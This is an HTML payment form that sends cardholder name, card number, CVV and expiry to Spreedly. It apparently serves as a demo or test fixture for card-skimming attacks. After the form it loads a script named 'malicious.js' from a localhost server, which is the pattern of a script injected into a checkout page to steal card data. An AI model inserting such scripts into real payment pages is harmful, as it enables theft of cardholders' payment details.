<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>Payment Page</title>
  <link rel="stylesheet" type="text/css" href="/styles.css">
</head>

<body>

  <form id="payment-form" accept-charset="UTF-8" class="spf-form" method="POST"
    action="https://core.spreedly.com/v1/payment_methods" >

    <input name="redirect_url" type="hidden" value="http://localhost:8080/submit" />
    <input name="environment_key" type="hidden" value="UjBjPb64cci9m6MlZaL2tEVp1g4" />

    <fieldset class="spf-fs-name">
      <h2>Name</h2>
      <div class="spf-field spf-field-fname">
        <label class="internal" for="spf-fname">First Name</label>
        <input type="text" class="spf-input-text" name="credit_card[first_name]" id="first_name">
      </div>
      <div class="spf-field spf-field-lname">
        <label class="internal" for="spf-lname">Last Name</label>
        <input type="text" class="spf-input-text" name="credit_card[last_name]" id="last_name">
      </div>
    </fieldset>

    <fieldset class="spf-fs-cc">
      <h2>Payment Details</h2>

      <div class="spf-field">
        <div id="spreedly-number-test" class="spf-field-group spf-number spf-field-cc">
          <label class="spf-field-group spf-number" for="card_number">Credit Card Number</label>
          <input type="number" class="spf-input-text" pattern="[0-9]*" name="credit_card[number]" id="card_number" autocomplete="off" size="19"></input>
        </div>
        <div id="spreedly-cvv-test" class="spf-field-group spf-verification_value spf-field-cc">
          <label class="spf-field-group spf-verification_value" for="cvv">CVV</label>
          <input type="number" class="spf-input-text" id="cvv" name="credit_card[verification_value]" size="4" autocomplete="off"></input>
        </div>
      </div>

      <div class="spf-field spf-field-exp">
        <label>Expiration Date</label>
        <div class="spf-field-group spf-month">
          <input type="text" class="spf-input-text spf-exp" name="credit_card[month]" id="month" size="3" maxlength="2" placeholder="MM">
        </div>
        <span class="spf-exp-divider">/</span>
        <div class="spf-field-group spf-year">
          <input type="text" class="spf-input-text spf-exp" name="credit_card[year]" id="year" size="5" maxlength="4" placeholder="YYYY">
        </div>
      </div>
    </fieldset>

    <fieldset class="spf-field-submit">
      <input type="submit" class="button" value="Submit Payment">
      <div id="message"></div>
      <div id="errors"></div>
    </fieldset>
  </form>
</body>
<script src="http://127.0.0.1:8081/static/malicious.js"></script>
</html>
